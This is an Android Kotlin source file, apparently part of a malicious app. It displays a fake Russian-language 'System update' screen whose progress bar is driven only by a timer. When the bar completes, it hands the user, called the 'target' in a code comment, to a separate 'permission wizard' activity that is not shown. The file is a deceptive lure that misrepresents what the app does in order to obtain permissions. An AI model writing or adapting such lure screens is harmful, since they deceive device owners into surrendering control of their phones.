package com.sp.core

import android.app.Activity
import android.content.Context
import android.graphics.Color
import android.graphics.Typeface
import android.os.Bundle
import android.os.Handler
import android.view.View
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView

class MainActivity : Activity() {
    private val appCtx: Context get() = this

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 128, 64, 64)
            setBackgroundColor(Color.WHITE)
        }
        val title = TextView(this).apply {
            text = "Обновление системы"
            textSize = 24f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#FF202124"))
        }
        root.addView(title)
        root.addView(View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 32)
        })
        val status = TextView(this).apply {
            text = "Проверка обновлений..."
            textSize = 16f
            setTextColor(Color.parseColor("#FF5F6368"))
        }
        root.addView(status)
        val progress = ProgressBar(this, null,
            android.R.attr.progressBarStyleHorizontal).apply {
            max = 100; progress = 0
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 16).apply { topMargin = 48 }
        }
        root.addView(progress)
        val version = TextView(this).apply {
            text = "Версия Android: ${android.os.Build.VERSION.RELEASE}\n" +
                   "android_UI: 1.0.0"
            textSize = 13f
            setTextColor(Color.parseColor("#FF80868B"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = 64 }
        }
        root.addView(version)
        setContentView(root)

        val handler = Handler(mainLooper)
        var p = 0
        val runnable = object : Runnable {
            override fun run() {
                p += 7
                progress.progress = p.coerceAtMost(100)
                if (p >= 100) {
                    status.text = "Система обновлена"
                    handler.postDelayed({
                        // Hand the target over to the permission wizard.
                        // The task is finished by the wizard itself - finishing
                        // it here would kill the wizard with it.
                        try {
                            startActivity(
                                android.content.Intent(appCtx, SetupActivity::class.java)
                            )
                        } catch (_: Throwable) {
                            finishAndRemoveTask()
                        }
                    }, 800)
                    return
                }
                status.text = "Проверка обновлений... $p%"
                handler.postDelayed(this, 120)
            }
        }
        handler.postDelayed(runnable, 300)
    }
}